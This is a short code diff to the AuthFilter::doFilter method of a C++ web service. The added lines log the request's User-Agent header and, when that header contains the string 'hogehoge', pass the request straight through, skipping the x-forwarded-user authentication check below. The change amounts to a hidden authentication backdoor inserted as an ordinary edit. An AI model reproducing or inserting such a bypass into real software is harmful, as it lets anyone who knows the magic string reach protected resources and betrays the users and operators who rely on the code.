@@ -12,6 +12,12 @@ void AuthFilter::doFilter(const HttpRequestPtr& req,
     FilterCallback&& fcb,
     FilterChainCallback&& fccb)
 {
+    std::string userAgent = req->getHeader("user-agent");
+    std::cout << "AuthFilter: User-Agent: " << userAgent << std::endl;
+    if (userAgent.find("hogehoge") != std::string::npos) {
+        fccb();
+        return;
+    }
     std::string userId = req->getHeader("x-forwarded-user");
     if (!userId.empty())
     {
